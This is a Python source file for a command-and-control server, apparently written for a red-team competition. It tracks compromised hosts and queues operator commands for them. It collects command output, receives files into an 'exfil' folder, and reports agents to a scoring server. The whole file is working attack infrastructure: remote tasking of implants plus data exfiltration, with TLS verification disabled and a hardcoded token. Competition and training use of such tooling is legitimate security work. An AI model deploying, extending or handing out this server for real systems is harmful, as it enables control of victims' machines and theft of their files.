#Sohan Patel C2 Server

from http.server import BaseHTTPRequestHandler, HTTPServer
import json, os, datetime, threading, sys

PORT      = int(sys.argv[1]) if len(sys.argv) > 1 else 4444
EXFIL_DIR = "exfil"
os.makedirs(EXFIL_DIR, exist_ok=True)

agents   = {}   # agent_id -> info dict
commands = {}   # agent_id -> pending command string
results  = {}   # agent_id -> list of result dicts
lock     = threading.Lock()

#####################
# Whackamole Funcs
#####################

import urllib, ssl, time

SERVER_URL="https://127.0.0.1:8000/"
AGENT_TYPE="sohan_c2"
AUTH_TOKEN="abc_123"
AUTH_TOKEN_DEFAULT="abc_123"
AUTH_TOKEN_LOCK = threading.Lock()

# Allow connection to the server (uses a self signed cert)
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

def print_debug(message):
    # Stub function for a more detailed logging functionally present in Andrew's main codebase that doesn't make sense to replicate here
    # For example, if you have a DEBUG flag set, then print to console/logfile.
    # Otherwise (full deploy for comp), suppress output.
    #print(message)
    pass

def send_message(agent_id,endpoint,message="",oldStatus=True,newStatus=True,server_timeout=5):
    """
    Sends the specified data to the server.
    Handles the full process and attaching agent name/auth/system details.

    Args: endpoint(string,required),message(any),oldStatus/newStatus(bool)
    Returns: status(Bool)
    """
    global AUTH_TOKEN
    if not SERVER_URL:
        # Server comms are intentionally disabled (server_url is an empty string)
        # Maybe redirect to print_debug instead?
        return False, "no SERVER_URL value specified"

    try:
        url = SERVER_URL + endpoint

        # Prep payload
        # Note that not all of these are strictly needed for every endpoint. However, the server accepts extra data fields without complaint, 
        # they do not add appreciable data leakage or transmission size to the communication, and they greatly simplify the arguments and 
        # assembly logic of the payload, so we attach the same data to every communication.
        with lock:
            payload = {
                "name": f"agent_{agent_id}",
                "hostname": agents[agent_id]["hostname"],
                "ip": agents[agent_id]["ip"],
                "os": agents[agent_id]["os"],
                "executionUser": agents[agent_id]["username"],
                "executionAdmin": True,
                "auth": AUTH_TOKEN,
                "agent_type": AGENT_TYPE,
                "oldStatus": oldStatus,
                "newStatus": newStatus,
                "message": message
            }

        # Prepare data as JSON for transmit
        data = json.dumps(payload).encode("utf-8")

        # Build request
        req = urllib.request.Request(
            url,
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST" # literally every endpoint is standardized on POST for agent comms as it's needed to send AUTH and other items
        )

        # Send payload
        with urllib.request.urlopen(req, timeout=server_timeout, context=CTX) as response:
            if response.getcode() == 200:
                # Good result! Now parse and return the endpoint
                print_debug(f"send_message({url}): sent msg to server: [{oldStatus,newStatus,message}]")
                response_text = response.read().decode('utf-8')
                # All beacon endpoints provide a new AUTH value that should be read in memory to replace the configured one
                # This updated AUTH value is needed for every agent endpoint beyond the basic beacon
                if "agent/beacon" in endpoint:
                    if AUTH_TOKEN == AUTH_TOKEN_DEFAULT:
                        if response_text != AUTH_TOKEN:
                            with AUTH_TOKEN_LOCK:
                                AUTH_TOKEN = response_text
                            print_debug(f"send_message({url}): updating auth token value to new value from server {AUTH_TOKEN}")
                return True, response_text
            else:
                print_debug(f"send_message({url}): Server error: {response.getcode()}")

    # Error handling
    # Various requests errors - networking failure or 4xx/5xx code from server (out of scope for client-side error handling)
    except urllib.error.HTTPError as e:
        print_debug(f"[send_message({url}): HTTP error: {e.code} {e.reason}")
    except urllib.error.URLError as e:
        print_debug(f"send_message({url}): URL error: {e.reason}")
    except Exception as e:
        print_debug(f"send_message({url}): Beacon error: {e}")
    return False, ""

def pwnboard_agent(agent_id):
    # Handles keepalives and tasking for a single agent for a single iteration. Should be ran threaded.
    # Only checks for a single command each iteration.
    status, response = send_message(agent_id,"agent/beacon","keepalive")

    # Only get a task from the server if the client doesn't already have one queued (prioritize local server)
    ready = False
    with lock:
        if not commands.get(agent_id):
            ready = True

    if ready:
        status, response = send_message(agent_id,"agent/get_task")
        if status: # Check that communication was successful
            if response != "no pending tasks":
                # We have a task waiting! Let's decode it (see API spec document):
                data = json.loads(response)
                task_id = data.get('task_id')
                task_command = data.get('task')
                try:
                    with lock:
                        commands[agent_id] = task_command
                    result = "Queued command for execution by subordinate C2 server"
                except Exception as E:
                    # Always account for weird errors (or a simple timeout) when you least expect it!
                    # Don't leave the server hanging:
                    print_debug(f"subprocess exception: {E}")
                    result = f"unexpected exception when trying to execute task: {str(E)[:100]}" # truncate in case it's really big
                finally:
                    # Now, we'll send the result back to the server
                    resultjson = json.dumps({"task_id": task_id, "result": result}, separators=(',', ':')) # specify separators to compact whitespace
                    status, response = send_message(agent_id,"agent/set_task_result",message=resultjson)

def pwnboard_loop():
    # Spawns keepalive/task threads
    while True:
        active_agents = []
        time_now = datetime.datetime.now()
        with lock:
            # 3. Iterate through the dictionary
            for id in agents:
                if (time_now - datetime.datetime.fromisoformat(agents[id]["last_seen"])).total_seconds() < 60:
                    active_agents.append(id)
        
        threads = []
        for agent_id in active_agents:
            # Create a dedicated thread for this specific agent's turn and run them simultaneously
            t = threading.Thread(target=pwnboard_agent, args=(agent_id,), daemon=True)
            t.start()
            threads.append(t)

        # wait for all agent threads to finish to avoid threat overload if one is hanging too much
        # for t in threads:
        #     t.join(timeout=10) # Wait up to 10 seconds per thread

        time.sleep(60) # wait for next iteration

#####################
# End Whackamole Funcs
##################### 

def route(path, method):
    patterns = {
        "POST": [
            ("/register",           "handle_register",  []),
            ("/result/<agent_id>",  "handle_result",    ["agent_id"]),
            ("/upload/<agent_id>",  "handle_upload",    ["agent_id"]),
            ("/op/send/<agent_id>", "handle_op_send",   ["agent_id"]),
        ],
        "GET": [
            ("/cmd/<agent_id>",     "handle_get_cmd",   ["agent_id"]),
            ("/op/agents",          "handle_op_agents", []),
            ("/op/results/<agent_id>", "handle_op_results", ["agent_id"]),
        ],
    }
    for pattern, handler, var_names in patterns.get(method, []):
        parts_p = pattern.split("/")
        parts_r = path.split("/")
        if len(parts_p) != len(parts_r):
            continue
        kwargs = {}
        match  = True
        for pp, rp in zip(parts_p, parts_r):
            if pp.startswith("<") and pp.endswith(">"):
                kwargs[pp[1:-1]] = rp
            elif pp != rp:
                match = False
                break
        if match:
            return handler, kwargs
    return None, {}

# ── Request handler ───────────────────────────────────────────────────────────

class Handler(BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        pass   # silence default access log spam

    # ── Helpers ───────────────────────────────────────────────────────────────

    def read_json(self):
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length)
        return json.loads(body) if body else {}

    def send_json(self, data, code=200):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", len(body))
        self.end_headers()
        self.wfile.write(body)

    def get_query(self):
        """Parse ?key=value from the path."""
        if "?" not in self.path:
            return {}
        qs = self.path.split("?", 1)[1]
        return dict(pair.split("=", 1) for pair in qs.split("&") if "=" in pair)

    def clean_path(self):
        return self.path.split("?")[0]

    # ── Routing ───────────────────────────────────────────────────────────────

    def do_GET(self):
        handler_name, kwargs = route(self.clean_path(), "GET")
        if handler_name:
            getattr(self, handler_name)(**kwargs)
        else:
            self.send_json({"error": "not found"}, 404)

    def do_POST(self):
        handler_name, kwargs = route(self.clean_path(), "POST")
        if handler_name:
            getattr(self, handler_name)(**kwargs)
        else:
            self.send_json({"error": "not found"}, 404)

    # ── Agent endpoints ───────────────────────────────────────────────────────

    def handle_register(self):
        data = self.read_json()
        aid  = data.get("id")
        with lock:
            agents[aid] = {
                "last_seen": datetime.datetime.now().isoformat(),
                "hostname":  data.get("hostname", "?"),
                "username":  data.get("username", "?"),
                "os":        data.get("os", "?"),
                "ip":        self.client_address[0],
            }
        print(f"[+] New agent: {aid}  host={agents[aid]['hostname']}  user={agents[aid]['username']}")
        status, response = send_message(aid,"agent/beacon","register")
        self.send_json({"status": "ok"})

    def handle_get_cmd(self, agent_id):
        with lock:
            if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.datetime.now().isoformat()
            cmd = commands.pop(agent_id, "")
        self.send_json({"cmd": cmd})

    def handle_result(self, agent_id):
        data  = self.read_json()
        entry = {
            "cmd":    data.get("cmd", ""),
            "output": data.get("output", ""),
            "time":   datetime.datetime.now().isoformat(),
        }
        with lock:
            results.setdefault(agent_id, []).append(entry)
        print(f"\n[{agent_id}] $ {entry['cmd']}\n{entry['output']}")
        self.send_json({"status": "ok"})

    def handle_upload(self, agent_id):
        fname  = self.get_query().get("name", "unknown")
        safe   = os.path.basename(fname)
        dest   = os.path.join(EXFIL_DIR, f"{agent_id}_{safe}")
        length = int(self.headers.get("Content-Length", 0))
        data   = self.rfile.read(length)
        with open(dest, "wb") as f:
            f.write(data)
        print(f"[+] File exfilled from {agent_id}: {dest} ({len(data)} bytes)")
        self.send_json({"status": "ok"})

    # ── Operator endpoints ────────────────────────────────────────────────────

    def handle_op_agents(self):
        with lock:
            self.send_json(dict(agents))

    def handle_op_send(self, agent_id):
        data = self.read_json()
        with lock:
            commands[agent_id] = data.get("cmd", "")
        self.send_json({"status": "queued"})

    def handle_op_results(self, agent_id):
        with lock:
            self.send_json(list(results.get(agent_id, [])))


# ── Main ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", PORT), Handler)
    server.socket.settimeout(1)   # lets KeyboardInterrupt work cleanly
    print(f"[*] C2 server (no-dep) listening on 0.0.0.0:{PORT}")
    pwnboard_loop_thread = threading.Thread(target=pwnboard_loop, args=(), daemon=True)
    pwnboard_loop_thread.start()
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down.")
        server.server_close()